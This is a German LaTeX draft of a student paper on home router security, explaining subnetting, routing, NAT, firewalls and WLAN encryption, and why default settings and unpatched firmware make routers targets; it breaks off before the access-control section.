	\chapter*{Kurzfassung}
	In dieser Ausarbeitung wird auf die Funktiosnweise und die Schwachstelle
	eine Routers eingegangen. Dieser koordiniert die Kommunikation über Netzwerkgrenzen
	hinweg und ermöchlicht auch eine Verbindung ins Internet. Neben den Ports
	am Router, über die internetfähgige Geräte direkt an geschlossen werden 
	können ist auch das Zurverfügungstellen eines WLAN möglich. Bleibt der 
	Router bei der Installation auf den Werkseinstellungen birgt das einige
	Gefahren und macht es unteranderem sehr einfach sich unbemerkt in das WLAN
	einzuloggen. Die daraus entstehenden Sicherhetislücken werden beleutet, als
	auch allgemeine Schwachstellen der Router. Wie eben beschrieben kann der
	Router auch eine Verbindung ins Internet darstellen und hat dadurch eine 
	noch größere Angriffsfläche für Angreifer. Die Ausnutzung solcher Schwachstellen,
	derer die über offizielle Stellen wie die \emph{CVE.org} oder die \emph{NIST}
	veröffentlich wurden werden teilweise ausgenutzt und die Auswirkungen
	auf den Router und die Sicherheit der Geräte im Netzwerk wird eingegangen.
	Die Hersteller Hinweise einzuhalten und bei der Konfiguration des Routers
	umzusetzen ist sehr wichtig, was auch die Tests zeigen. Zudem sollten 
	Updates, wenn möglich automatisch oder manuell regelmäßig, durchgeführt 
	werden, um sicherzustellen, dass Schwachstellen auch auf dem eigenen Router
	tatsächlich behoben sind.

	\chapter{Einleitung}
	In dieser Ausarbeitung geht es um die Schachstellen eines Router und die 
	Auswirkungen getätigter Sicherheitsmechanismen. Da jeder der internetfähige
	Endgeräte benutzt, diese früher oder später mit einem Router per WLAN verbindet
	ist es wichtig die Schwachstellen der Router zu kennen. Sind diese Probleme
	bekannt kann der User sich und seine  Daten schützen und auch selbst den
	Router im eigenen Heimnetz bestmöglich vor unbefugtem Zugriff über das
	WLAN zu schützen. In den Abschnitten, die die Tests enthalten wird unter
	anderem gezeigt, welche Auswirkungen kleine Änderungen der Sicherheitseinstellungen
	in der Router Konfiguration haben. Zudem werden bereits bekannte Schwachstellen
	der beiden Router getestet, als auch deren Auswirkungen dokumentiert.

	\section{Motivation}
	Das Thema Router ist für die meisten Personen relevant, da fast jeder ein 
	solches Gerät zu Hause hat, es täglich nutzt und damit nicht nur unproblematische
	Dinge macht, wie bspw. Bilder von einem PC zu einem Tablet zu senden sondern auch
	persönliche oder gar geheime Daten über das Internet übermittelt. Die meisten
	Personen denken hierbei erst einmal an persönliche Daten wie die Adresse oder 
	die Bankdaten, aber auch geheime Dokumente, die während dem Home Office versendet
	werden, werden über den Router übertragen. Durch eine unsichere Einrichtung des
	Router können massive Schwachstellen entstehen, die Angreifer ausnutzen können.
	Daher ist es wichtig den Router im Heimnetzwerk so gut es geht abzusichern, 
	die Angriffsfläche so klein wie möglich zu halten und ihn uptodate zu halten.
	\cite{chalhoub2023, bsi} %Chapter 1, p.277 -> Covid Pandemie

	\section{Router Grundlagen}
	Wie der Name erahnen lässt ist der Router innerhalb eines Netzwerks dafür
	zuständig Nachrichten von einer verbundenen Quelle zum Ziel zu leiten.
	Der Router kümmert sich darum, dass der optimale Weg von der Quelle zum Ziel 
	gefunden wird. Welcher Pfad gewählt wird hängt unteranderem von den Protokollen
	und der Konfiguration ab, es kann der schnellste Weg genutzt werden oder
	auch eine definierte Route über verschiedene Punkte. Es gibt zwei Arten
	des Routing, dynamisches und statisches Routing. Auf diese wird in Abschnitt
	\ref{sec:Routing-Arten} weiter eingegangen.
	Wichtig zu Beachten ist der Unterschied zwischen Router und Switch. Beide
	Geräte sind für die Weiterleitung der Pakete an das richtige Ziel zuständig.
	Die Switches der Schicht 2 (ISO/OSI Modell) können nur Frames innerhalb 
	eines lokalen Netzwerks auf Basis der MAC-Adressen weiterleiten. 
	Diese können nicht über Layer 3 Netzwerkgrenzen, also in ein anderes 
	IP-Netzwerk mit anderem Adressbereich, als dem Quellnetzwerk kommunizieren. 
	Switches der Schicht 3 können über Netzwerkgrenzen hinweg Pakete versenden 
	und Kombinierend ie Funktion von Switch und Router. Der Hauptunterschied 
	zwischen Switches und Routern ist, dass der Router nicht nur über Netzwerkgrenzen 
	hinweg Pakete leiten kann sonder, dass er aus dem LAN auch in das Internet, 
	Pakete versenden kann. Auch der Router ist ein Gerät der Schicht
	3 im ISO/OSI-Modell und vermittelt daher die Pakete anhand der IP-Adressen.
	\cite{zisler2022, baun2025}

	\subsection{Netzwerksegmente und IPv4}
	\label{sec:nwsegment_ipv4}
	Die Segmentierung eines Netzwerk ist dann sinnvoll, wenn es
	sich um eine große Infrastruktur, wie die eines Unternehmen handelt. Die 
	Subnetze besitzen einen logischen Adressraum, der abhängig sein sollte 
	von der Anzahl an Geräten, die in diesem Netzwerk sein sollen. 
	Um zu verstehen, wie eine Segmentierung funktioniert, muss zuerst der Aufbau
	der IP-Adresse verstanden werden, wobei IP für Internet Protocol steht. 
	In dieser Ausarbeitung wird nur mit
	IPv4 Adressen gearbeitet, weshalb nicht näher auf die IPv6 Adressen 
	eingegangen wird. Eine IPv4 Adresse besteht aus 4 Teilen, die durch einen 
	Punkt von einander getrennt sind. Jeder Teil beinhaltet eine Zahl zwischen 0
	und 255, daraus ergibt sich eine Größe von 32 Bit, was wiederum 4Byte 
	entspricht. Um in einem Subnetz kommunizieren zu können haben alle
	sich darin befindenden Geräte in ihrer IP-Adresse den gleichen Netzanteil.
	Das exakte Geräte innerhalb des Subnetz ist im Hostanteil der IP-Adresse zu
	finden. Diese muss zwingend einzigartig im jeweiligen Subnetz sein, da es
	sonst zu Konflikten kommt. Der Hostanteil nimmt entsprechend der Größe des 
	Subnetzes mehr oder weniger Bits der IP-Adresse ein. Die Größe des Anteils 
	kategorisiert das Netz in die Klassen A bis C siehe folgende Abbildung 
	\ref{fig:nwclasses}.
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.75\textwidth]{img/c-nw_nwklassen_s93.png}
		\caption{Host- und Netzanteil je Netzwerkklasse 
		\cite[S.95]{zisler2022}}
		\label{fig:nwclasses}
	\end{figure}
	Ob sich Quelle und Ziel im gleichen Subnetz befinden, wird von der Subnetzmaske
	bestimmt. Mit Hilfe dieser wird die IP-Adresse des Senders
	logisch UND verknüpt. Das gleiche wird mit der Ziel-IP-Adresse gemacht. Kommt bei
	beiden Rechnungen das gleiche Ergebnis heraus, sind die Teilnehmer im gleichen
	Subnetz und können somit über Layer 2, also mit Hilfe vom MAC-Adressen, die Frames
	austauschen. Wird ein Paket innerhalb des gleichen IP-Subnetz versendet, wird mit der MAC-Adresse
	gearbeitet. Der Sender hat eine sogenannte ARP Tabelle (Adress Resolution Protocol)
	in der die MAC-Adressen der Geräte, an die der Sender bereits ein Frame gesendet hat, enthalten
	sind. Es sind die IP-Adressen und die dazugehörige MAC-Adresse enthalten. Diese
	Informationen werden dann in der Tabelle gespeichert, nach einer konfigurierte
	Zeit gelöscht und müssen dann bei erneutem Senden an den Empfänger wieder 
	angefragt und gespeichert werden. Um die MAC-Adresse des Empfängers zu ermitteln
	sendet der Sender eine ARP-Anfrage in das lokale IP-Netz. Diese Anfrage wird an alle 
	Geräte im Netz gesendet, der sogenannte Broadcast. Das Gerät welches die
	gesuchte IP-Adresse hat antwortet mit seiner MAC-Adresse. Der Sender erhält die
	Adresse und sendet dann den Frame an die MAC-Adresse innerhalb des lokalen
	Netzwerks. 
	Befinden sich die Geräte nicht im gleichen Subnetzt, ist das Ergebnis der 
	Berechnung mit der Subnetzmaske verschieden und es muss über Layer 3, mit 
	dem Router das Paket versendet werden. Dafür wird das Paket 
	an die IP-Adresse des Routers gesendet, auch bekannt als Gateway. Die Routing-
	Tabelle im Router wird für die Kommunikation genutzt, um heraus zufinden über welchen 
	Port der Router das Paket weitergeleitet werden muss. Da der Router ein Layer 3 Gerät ist, 
	muss er die IP-Adresse des Zielgerätes kennen, um das Paket in das richtige 
	Netzwerk zu leiten. Die Tabelle beinhaltet alle Netzwerke, die über ein 
	Interface mit dem Router verbunden sind als auch deren Standardrouten. 
	Da sich das Subnetz über IP und Subnetzmaske berechnen lässt erkennt der 
	Router in welches Subnetz das 
	Paket gesendet werden muss. Dieser leitet es in das entsprechende Subnetz, 
	wo es dann entweder weiter geleitet oder direkt mit der MAC-Adresse an das 
	Zielgerät geleitet wird. In der folgenden Abbildung \ref{fig:subnetmask}
	sind zwei Berechnungen mit einer Subnetzmaske zu sehen. Die erste zeigt, 
	dass sich Quelle und Ziel im gleichen Subnetz befinden, während das
	zweite Beispiel zeigt, dass sie sich in unterschiedlichen Subnetzen befinden.
	\begin{figure}[H]
		\centering
		\includegraphics[width=\textwidth]{img/subnetmask_calculation_pic.pdf}
		\caption{Subnetzberechnung}
		\label{fig:subnetmask}
	\end{figure}

	\subsubsection{Private und öffentliche Adressen}
	\label{sec:priv_pub_adr}
	Die Einführung von IPv6 wurde unteranderem wegen der aufkommenden Adressknappheit
	umgesetzt. Fast jede Person hat mehrer Endgeräte, die entweder im lokalen Netz
	oder auch ins Internet kommunizieren können. Das führt dazu, dass die Anzahl
	an Adressen der Art IPv4 knapp werden. Ansätze wie die Netzwerksegmentierung,
	das oben beschriebene Subnetting, wirken diese Knappheit entgegen aber dies 
	reicht lange noch nicht aus. Damit es während der Kommunikation ins Internet keine
	Probleme gibt, weil eine lokales Endgerät die gleiche IP-Adresse hat wie zum
	Beispiel der Server von Google, wurden mit RFC 1918 die Adressbereiche für 
	private IP-Adressen definiert. Dafür wurden ein Teil der IPv4 Adressen für den 
	privaten Gebrauch reserviert. Geräte in privaten Haushalten nutzen daher
	häufig den Netzbereich 192.168.0.0/16. Das bedeutet, dass innerhalb eines 
	Haushalts 256 einzelne Netze mit jeweils 256 Adressen zur Verfügung stehen, 
	was in der Regel für einen normalen Haushalt ausreichend ist.
	Die öffentliche IP-Adresse ist die Adresse, die vom ISP zugewiesen wird. Der
	Router übersetzt die private IP-Adresse für die Kommunikation ins Internet
	durch die öffentliche IP-Adresse. Für diese Umwandlung kommt das NAT (Network
	Adress Translation) zum Einsatz. Auf NAT und dessen genaue Funktionsweise wird
	in Abschnitt \ref{sec:NAT} eingegangen.
	\cite{zisler2022, baun2025}

	\subsection{Aufbau und Verbindungsarten}
	\label{sec:build_connect}
	Die Beschreibung des Aufbau eines Routers wird in dieser Ausarbeitung auf
	die Komponenten beschränkt, die die beiden Router haben, die für die Tests
	verwendet werden. Es handelt sich dabei um folgende Geräte, die für den
	Gebrauch im eigenen Zuhause geeignet sind:
	\begin{description}
		\item[WRT120] Wireless-N Home Router, Hersteller: Linksys by Cisco
		\item[DIR-600] Wireless N 150 Home Router, Hersteller: D-Link
	\end{description}
	Es wird vorallem auf die Anschlüsse eingegangen und die Möglichkeiten 
	die Verbindung zum Internet herzustellen. Etwaige interne Hardwarekomponenten
	werden nur beschrieben, wenn diese eine mögliche Schwachstelle darstellen,
	die von außerhalb von einem Angreifer ausgenutzt werden kann.
	An der Rückseite der Router befinden sich die Ports, Resetbutton zum 
	zurücksetzen auf Werkseinstellungen, Internet-Port als auch der Anschluss
	für die Stromversorgung.
	Beide Router werden über den Internet Port mit einem Ethernet Kabel an das 
	eigene Netz entweder per Kabel- oder DSL-Internetverbindung angeschlossen.
	Über die 4 weiteren Ports werden Geräte im lokalen Netz direkt mit dem 
	Router verbunden. Weitere Geräte können per WLAN mit den Routern verbunden
	werden. Dabei stellt die Verbindung über WLAN die größte Schwachstelle dar,
	da man für diesen Zugang nicht physisch Zugriff zum Router benötigt. Daher
	ist es sehr wichtig die Standardpasswörter als auch den Namen des Router

	\subsection{Routing Arten und Protokolle}
	\label{sec:Routing-Arten}
	Es folgen die zwei Arten des Routing mit Vor- und Nachteilen als auch deren
	übliches Einsatzgebiet.
	\begin{description}
		\item[Statisches Routing]
		Die Route werden fest definiert und die Pakete werden immer auf dem selben 
		Weg versendet. 
		\begin{itemize}
			\item Vorteile: Kein Austausch über die Pfade mit anderen Routern
			notwendig, was wiederum zu weniger Datenverkehr führt. 
			\item Nachteile: Ist eine Route gestört, gibt es keine Alternative. 
			Bei Änderungen oder Störungen muss der Administrator manuell eine andere
			Route festlegen.
			\item Einsatzgebiet: Kleine Unternehmensnetze \cite[S.72]{mandl2019}
		\end{itemize}
		\item[Dynamisches Routing]
		Die Route wird dynamisch gewählt, abhänging von den Informationen in der 
		Routing Tabelle. Die Pakete können daher auf verschiedenen Routen versendet
		werden.
		\begin{itemize}
			\item Vorteile: Auch bei Netzwerkstörungen werden Pakete weitergeleitet.
			Bei einer ausgefallenen Route muss kein Administrator eingreifen.
			\item Nachteile: Austausch mit anderen Routern notwendig, um die Routing
			Tabelle aktuell zu halten, dadurch entsteht mehr Datenverkehr.
			\item Einsatzgebiet: Große Unternehmensnetze 
		\end{itemize}
	\end{description}
	Routing-Protokolle definieren die Regeln für die Kommunikation zwischen Routern.
	Sie können die Wegfindung im Netzwerk steuern, die Verwaltung der Routingtabellen
	sowie das Verhalten bei Störungen. Im Falle eines Ausfalls ermöglichen sie die
	automatische Berechnung alternativer Routen. Welche Informationen ausgetauscht
	werden hängt vom jeweiligen Protokoll ab. Diese Protokolle werden nur beim 
	dynamischen Routing eingesetzt, da dort die Wege mit den übermittelten Informationen
	automatisch angepasst werden. Im weiteren werden in aller Kürze die zwei Typen von
	Protokollen aufgezählt als auch jeweils ein speziellen Typen:
	\begin{description}
		\item[Distanzvektorprotokolle] arbeitet auf Grundlage des Bellman-Ford 
		Algorithmus. Beispiel: RIP (Routing Information Protocol) 
		\item[Link-State-Routing-Protokolle] arbeite auf Grundlage des Dijkstra-
		Algorithmus. Beispiel: OSPF (Open Shortest Path First)
	\end{description} \cite[S.191]{baun2025}
	Auf die Unterschiede der Routing-Protokolle hinsichtlich ihrer Einsatzgebiete
	wird im Folgenden nicht näher eingegangen.
	\cite{zisler2022, baun2025, mandl2019}

	\subsection{Kommunikation von LAN in WAN}
	\label{sec:lan_wan}
	Im folgenden Abschnitt wird erläutert, wie ein Router Datenpakete aus einem
	lokalen Netzwerk (LAN) in das Internet weiterleitet.
	\begin{figure}[H]
		\centering
		\includegraphics[width=\textwidth]{img/ipv4_packet-structure.pdf}
		\caption{Grober Aufbau eines IPv4-Pakets}
		\label{fig:ipv4-packet}
	\end{figure}
	Wie in der Abbildung \ref{fig:ipv4-packet} zu sehen besteht ein Paket aus einem 
	Header, Quell-Adresse gefolgt von der Ziel-Adresse - diese gehören standardmäßig
	zum Header, werden hier aber zur Veranschaulichung extra aufgeführt- und den 
	Nutzdaten. 
	Informationen über den Aufbau, Art und größe des Paketes sind im Header zu finden.
	Dort ist festgehalten ab wann die Nutzdaten beginnen, ob das Paket aufgrund
	seiner Größe fragmentiert wurde und auch die Lebenszeit des Paketes. Diese ist 
	wichtig, damit das Paket nur eine definierte Zeit im Netzwerk lebt und anschließend 
	automatisch gelöscht wird, sodass es keine unnötigen Ressourcen verbraucht.
	Fragmentierung von Paketen ist nötig, wenn das Paket die vordefinierte maximale Größe 
	überschreitet, dann wird das Pakete entweder vom Router oder dem Sender geteilt.
	Jedes Fragement wird als einzelnes Paket versendet, mit dem Unterschied das es 
	im Header die Information enthält, an welche Stelle das Fragement im unfragmentierten
	Paket gehört. Kommt ein Paket bei einem Router an und müsste fragmentiert werden,
	um in das Zielnetz weitergeleitet zu werden, kann es sein das diese verworfen
	wird, da eine Flag im Paket ausdrücklich das Fragmentieren diese Pakets verbietet.
	Pakete von IPv4 haben auch eine Prüfsumme inkludiert, welche aber zur Verbesserung
	der Datenübertragungsgeschwindigkeit nicht von Router überprüft wird. 
	\newline
	Möchte ein Benutzer eine Website im Internet aufrufen, gibt dieser in der
	Regel nicht direkt die IP-Adresse des Zielservers ein, da diese meist nicht
	bekannt ist. Stattdessen wird üblicherweise ein Domainname wie beispielsweise 
	\emph{www.google.com} verwendet. Damit eine Verbindung aufgebaut werden kann,
	muss zunächst die zugehörige IP-Adresse ermittelt werden. Dies geschieht
	mithilfe des Domain Name Systems (DNS). Ein DNS-Server liefert zu einem
	Domainnamen die entsprechende IP-Adresse zurück. Anschließend wird das Paket
	anhand der Ziel-IP-Adresse über mehrere Router weitergeleitet. Jeder Router
	entscheidet mithilfe seiner Routing-Tabelle, über welches Interface das
	Paket weitergeleitet werden soll. Die Ziel-IP-Adresse bleibt dabei unverändert.
	Lediglich die MAC-Adressen werden bei jedem Übertragungsschritt neu gesetzt.
	Wie im Abschnitt \ref{sec:priv_pub_adr} beschrieben, werden in lokalen 
	Netzwerken häufig private IP-Adressen verwendet. Damit Geräte mit dem Internet 
	kommunizieren können, führt der Router eine Network Address Translation (NAT) 
	durch. Dabei wird die private Quell-IP-Adresse im Paket durch die öffentliche 
	IP-Adresse ersetzt. Erhält der Router eine Antwort aus dem Internet, kann er
	diese mithilfe seiner NAT-Tabelle dem entsprechenden Endgerät im lokalen 
	Netzwerk zuordnen und an dessen private IP-Adresse weiterleiten.
	\cite{zisler2022, baun2025}

	\subsection{Router als attraktives Ziel für Angreifer}
	\label{sec:attractiv_target}
	Die oben genannten Funktionen des Router machen deutlich das dieser auch
	über das Internet als Angriffsziel genutzt werden kann. Zudem ist ein Router
	attraktiv, da man keinen physischen Zugang zum Gerät braucht, um in ein 
	privates Netz zu kommen. Der Router als Ziel hat vorallem in der Covid 
	Pandemie 2020 an Attraktivität stark zugenommen, da seit dieser Zeit mehr im 
	Home Office gearbeitet wird und Betriebsinterna, geheime Dokumente oder
	auch der Nachrichtenaustausch über den Router zu Hause geleitet werden
	\cite[S.277]{chalhoub2023}.
	\begin{quote}
		Aufgrund ihrer Funktion als Brücke zwischen lokalen und globalen 
		Netzwerken stellen sie zudem den größten Angriffsvektor dar.
		\cite{schwarz2021}
	\end{quote}
	In den meisten Haushalten ist ein Router Bestandteil und sehr oft sind 
	die Besitzer technisch nicht versiert genug oder sie interessieren sich 
	nicht für die Sicherheit ihres Routers, es reicht völlig aus wenn sie 
	ihn anschließen, dieser funktioniert und ab dann wird am Router selbst
	nichts mehr gemacht. Ein Router Hersteller erwähnte, dass die meisten User zum 
	Einrichten des Routers nicht einmal die dafür vorgesehene Website 
	aufsuchen \cite[S.285, Kapitel 4.4.3]{chalhoub2023}. 
	Dieses Vorgehen sorgt dafür das Standard Credentials als Anmeldedaten 
	bestehen bleiben und es für Angreifer einfach ist Zugang zum WLAN zu erhalten.
	Desweiteren ergab die Studie von Chalhoub und Martin \cite{chalhoub2023}
	das die Router Hersteller viele Probleme haben, welche die Routersicherheit
	stark ins Negative beeinflussen. Es folgen einige Punkte:
	\begin{itemize}
		\item{Herstellung durch Dritte, die nach Auslieferung aufgrund
		fehlernder Verträge nicht weiteren Support für die Geräte leisten}
		\item{Firmware Updates werden trotz Bekanntmachung und Anleitung
		nicht von den Besitzern ausgeführt}
		\item{Router werden weiterhin benutzt, trotz EOL (End of Life), 
		Schwachstellen oder EOS(End of Support). Nach drei bis fünf Jahren
		werden keine Updates mehr gemacht und auch sonst kein weiterer Support 
		angeboten.}
	\end{itemize}
	Zudem wird erwähnt, dass bekannte Schwachstellen teilweise
	nicht gepatched werden, da die Hersteller entweder zeitlich nicht die 
	Kapazität haben erstellte Patches ausreichend zu testen oder aber auch 
	weil die Priorisierung von Schwachstellen nicht standardisiert ist und jeder
	Hersteller eine ander Taktik anwendet. Die Schachstellen werden teilweise
	nach der aktuellen Gefahrenlage priorisiert, das heißt gibt es eine 
	Schachstelle die oft ausgenutzt wird, hat diese einen größeren Einfluss
	auf den User und wird daher höher eingestuft als vielleicht eine Zero-Day
	Schwachstelle, die von der CVE schwerwiegender eingestuft wird aber nicht
	oft ausgenutzt wird. Hierbei ist \emph{nicht oft}, relativ zu sehen, da diese
	Schwachstellen seltener ausgenutzt werden als die Priorisierten.
	Andere Hersteller nutzen Datenmodelle oder Matizen zur Priorisierung.
	\newline
	Zum Standardpasswort des Routers gibt es meist auch einen Standardnamen, 
	weshalb es zwingend erforderlich ist diesen zu Beginn der Einrichtung 
	ebenfalls zu ändern. Durch diese Änderung lässt sich von außerhalb nicht
	bestimmen, um welchen Typen von Router es sich handelt. Dadurch kann 
	verhindert werden, dass ein Angreifer herausfindet, welchen Router 
	man verwendet, da dies häufig bereits am Standardnamen des Routers 
	erkennbar ist. Über eine Websuche könnte anschließend das Datenblatt
	gefunden werden, in dem oft die Standard-Anmeldedaten stehen. 
	Als Nutzer ist es ebenfalls wichtig zu wissen, dass ein Update 
	der Firmware nicht zwingend bedeutet, dass ältere Schwachstellen auch 
	beseitigt wurden.\cite{chalhoub2023, schwarz2021, bsia}
	Im Abschnitt \emph{Verwaltung > Aktualisieren der Firmware} im Handbuch ist
	deren Update lediglich bei Problemen empfohlen:
	\begin{quote}
		Aktualisieren Sie die Firmware nur dann, wenn Probleme mit dem 
		Router auftreten oder die Firmware eine neue Funktion enthält, die Sie
		verwenden möchten.
		Quelle: WRT120N-EMEA\_combo\_UG.pdf
	\end{quote}
	Diese Aussage verleitet dazu die Updates nur zu machen wenn der 
	Router nicht mehr eine stabile Internetverbindung zur Verfügung stellt,
	was wiederum die Aussage von Chalhoub und Martin \cite{chalhoub2023} 
	untermauert, dass der Router nur nochmals vom Benutzer eingestellt wird
	wenn dieser nicht ordnungsgemäß funktioniert.

	\subsection{Adressverbergung(NAT - RFC 30022)}
	\label{sec:NAT}
	%--------------------------------------------------------------------------------%
	%-----------Nochmal überarbeiten----formulierung und rechtschreibung anpassen----%
	Networke Address Translation(NAT) ist ein Mechanismus, bei dem der Router interne 
	IP-Adressen eines lokalen Netztwerks (LAN) in eine öffentliche IP-Adresse übersetzt.
	Es gibt welweit ungefähr 4 Millarden public IPv4 Adressen, sie sind durch ihre Architektur begrenzt.
	Private Adressen werden lediglich innerhalb eines lokalen Netzwerks genutzt.
	Haushalte oder Frimen haben alle eine private IP Adresse mit der sie mit dem Router verbunden sind.
	Der Router wiederum hat eine public IP Adresse, und hat somit zugriff auf das Internet.
	Über den Router können so alle Geräte auf das Internet zugreifen.
	NAT übersetzet also ein Satzt von IP AdrAessen zu einem anderen Satz an IP-Adressen.
	Es übersetzet also von Privat zu Public aber auch andersherum

	NAT selbst ist nicht offiziel ein Sicherheitsmechanismen, kann aber also solcher intepretiert werden
	Den Aufgrund der übersetetzung mehrerer lokaler IP-Adressen zu eine publizierten kann von
	außen nicht festgestellt werden, wie das betrachetet Netztwerk intern aufgebaut ist
	oder wie viele sich in ihm befinden. Zudem ist keine direkte verbindung von außerhalb mit
	den Geräten möglich solange dies nicht explizit erlaubt wird.

	NAT bietet eine impllizite Schutzwirkung, aber keine echte Sicherheit im klasischen Sinne.
	Nicht angeforderte verbindungen werden blockiert, die Angriffsfläche wird reduziert und Geräte können
	nicht direkt adressiert werden. \cite{egevang2001b}

	\subsection{Paketfilterung und Stateful Firewalls}
	\label{sec:Paketfilterung und Stateful Firewalls}
	Eine Firewall ist ein zentrales Sicherheitselement in Netzwerken und Schützt diese vor 
	unerlaubten Zugriffen und Bedrohungen, in dem sie den Datenverkehr überwacht.
	Die Firewall filtert den Verkehr anhand von definierten Filtern, wobei dort die entschieden wird,
	welche Datenpackete erlaubt oder blockiert werden.
	Grundsätzlich wird zwischen zustandbehaftete(Stateful) und zustandlose(Statless) Firewalls entschieden,
	wobei letztere den heutigen Standart darstellt.
	
	Zustandslose Firewalls (Stateless Firewalls)
	Zustandslose Firewalls gehören zu den älteren Modellen. Si verlassen sich bei der
	filterung der Daten auf eine Zugriffskontrolliste.
	Die entscheidung in welche Kategorie ein Packet fällt wird aufgund der mitgelieferten
	Informationen getroffen. Die Firewall speichert keine Informationen über den Satus oder den Kontext der
	Verbindung. Die Filterung basiert auf der überprüfung der Access Controle List (ACL). Dabei werden Informationen
	aus dem Packet-Header ausgewertet insbesondere:
	\begin{itemize}
		\item{Quell-IP-Adresse}
		\item{Ziel-IP-Adresse}
		\item{Portnummern}
		\item{verwendetes Protokoll (z. B. TCP oder UDP)}
	\end{itemize}
	Da keine Zustandsinformationen gespeichert werden, kann die Firewall nicht erkenen ob ein Packet zu einer bestehenden
	Verbindung gehört. Jede entscheidung wird also isoliert getroffen.
	Der große Vorteil des Ansatz liegt im geringen Ressourcenverbrauch und der hohen Verarbeitungsgeschwindigkeit.
	Daher werden sie in einer Umgebung mit sehr hohem Datenaufkommen eingesetzt und vorgeschatet, um einfache
	Filteraufgaben zu übernehmen.
	Allerdings hängt die Sicherheit stark von der Qualität der Konfiguration ab. Fehler in den Regeln können 
	dazu führen, das unerwünschter Datenverkehr zugelassen wird.

	Zustandsbehaftete Firewalls (Stateful Firewalls)
	Die Zustandsbehaftete Firewall ist heute die am Häufigsten eingesetzte Firewall-Technologie.
	Sie überwacht die Datenpackete und den Kontext des Datenverkehrs.
	Hierzu wird eine sogennante Zustandstabelle (State Table) gewührt, welche die aktiven Verbindungen speichert.
	Diese enthält Informationen wie:
	\begin{itemize}
		\item{Quell-IP-Adresse}
		\item{Ziel-IP-Adresse}
		\item{Portnummern}
		\item{Verbindungsstatus (z. B. aufgebaut, etabliert, beendet)}
	\end{itemize}
	Basierden auf diesen Informationen entscheiden die Firewall über die eingehenden Packete.
	Dadurch ist eine dynamische Packetfilterung möglich.
	Ein wesntlicher Vorteil ist die deutlich höhere Sicherheit, da nur solche Packete zugelassen werden, 
	die Teil einer legitimen Verbindung sind. 
	Allerdings ist der Ressourcenverbrauch deutlich höher als bei Zustandslose Firewalls.
	Verbidungszustände müssen stetig neu gespeichert und verglichen werden.
	Auch hier sind schlecht konfigurierte Firewalls anfäälig für Attacken wie beispielsweise
	Denial-of-Service (DDoS) oder Man-in-the-Middle-Angriffe.

	In der Praxis wird häufig eine Kombination aus beiden Ansätzen angewendet. Die Zustandslose Firewall filtert
	den Datenverkehr vor und die Zustandsbehaftete Firewall bessert nach. Dadurch lässt sich eine Balance
	zwischen Perfosmance und Sicherheit erreichen. \cite{scarfone2009b}

	\subsection{WLAN-Verschlüsselung}
	\label{sec:WLAN-Verschlüsselung}
	Bei der WLAN-Verschlüsselung wird die Funkkommunikation zwischen dem Endgerät und dem 
	Access-Point abgesichert. Dies basiert auf IEEE-802.11-Familie, insbesondere Erweiterungen wie
	IEEE 802.11i (für WPA2) und neuere Spezifikationen für WPA3. Ist der Datenverkehr unverschlüsselt, 
	kann jedes Gerät in Reichweite den Datenverkehr mithören.

	WPA2
	Für WPA2 muss eine Verschlüsselung durch AES-CCMP (Counter Mode with CBC\_MAC Protokoll) gegeben sein.
	CCMP ist ein Sicherheitsmechanismus, der auf Advanced Encryption Standart (AES) basiert und sowohl
	Vertraulichkeit als auch Integrität und Authentizität der Daten sicherstellt.
	Das Verfahren verknüpft zwei AES Modi. Beim Counter Mode (CTR) ist für die
	Verschlüsselung des Klartextes verantwortlich, der CBC-MAC (Cipher Block Chaining Message Authentication Code)
	sorgt für die Integrität in dem er einen Authentifizierungswert berechnet. Dieser stellt sicher,
	das die Daten nicht unbemerkt manipuliert werden können. Bevor die eigentliche übertragung der Daten
	beginnt, wird ein Sitzungsschlüssel ausgehandelt.
	\begin{itemize}
		\item{Beide Seiten besitzen einen Pre-Shared Key (PSK)}
		\item{Daraus wird der Pairwise Master Key (PMK) berechnet}
		\item{Im 4-Way Handshake werden Zufallszahlen ausgetauscht}
		\item{Daraus wird der Pairwise Transit Key (PTK) berechnet}
		\item{Der PTK ist in Teilschlüssel für die Verschlüsselung, Integrität und Nachrichtenvalidierung aufgeteilt}
	\end{itemize}
	WPA2 wird heute weittestgehend durch WPA3 ersetzt, da es einige Schwachstellen aufweist.
	Schwache Passwörter ermöglichen Offline-Brute-Force Angiffe. Angreifer können den Wiederholten Handshake ausnutzen
	(KRACK-Angriff). Das wiederverwenden von Zufallszahlen kann die icherheit kompromittieren.
	
	WPA3:
	WPA3 ist die Weiterentwicklung von WPA2. Bei dem verfahren werden keine Sitzungsschlüssel mehr verwendet,
	sondern SAE(Dragonfly Handshake).
	Der Personal-Mode ist für den Privatgebrauch konzipiert. Alle Nutzer verwenden einen Pre-Shared Key (PSK)
	also das gleiche Passwort um das Netztwerk nutzen zu können. Der "Enterprise-Modus" wurde für Unternehmen
	entwickelt. Er ermöglicht die individuelle Authentifizierung, durch den Benutzer. Dieser meldet sich mit dem 
	individuellen Benutzernamen und Passwort am netztwerk an.
	SAE (Dragonfly Handshake) bildet die Grundlage für einen sicheren Austausch der Sitzungsschlüssel zwischen
	dem Access Point und dem WLAN-Client. Im Gegensatz zu WPA2 wird bei WPA3 das "Shared Secret". also das Geheimniss
	nicht über den Funkkanal übertragen sondern nur das Ergebnis einer Berechnung. Zudem stellt SAE sicher,
	dass ein Angreifer selbst wenn er das Passwort kenne sollte, keine im voraus aufgezeichneten Datenpackete
	nachträglich entschlüsseln kann. Das nennt sich Perfek Forward Secrecy.
	\begin{itemize}
		\item{Die Parteien starten mit einem Passwort}
		\item{Beide Seiten berechnen einen Punkt auf einer elliptischen Kurve, basierend auf dem Passwort}
		\item{Es werden nur abgeleitete Werte über den Netzwerkverkehr ausgetauscht}
		\item{Im 4-Way Handshake werden Zufallszahlen ausgetauscht}
		\item{Das gemeinsame Geheimnis wird berechnet, ohne dass das Passwort selbst übertragen wird}
	\end{itemize}
	Dieses Vorgehen bietet Schutz gegen OffOffline-Brute-Force Angiffen. Zudem werden eine sensiblen Informationen
	übertragen und durch das PFS können selbst bei bekanntmachung der Schlüssel, die vergangenen Sitzungen nicht entschlüsselt werden.

	OWE (Opportunistic Wireless Encryption)
	OWE ermöglicht Verschlüsselung auch in offenen WLAN-Netzten ohne Passwort. Es wird automatisch ein temporärer
	Schlüssel zwischen dem Client unde dem Access Point ausgehandelt. OWE bietet Schutz vor passivem Mithören, kann
	aber keine Authentifizierung sicherstellen. \cite{frankel2007b, souppaya2012b}

	\subsection{Zugriffskontrolle}
	\label{sec:Zugriffskontrolle}
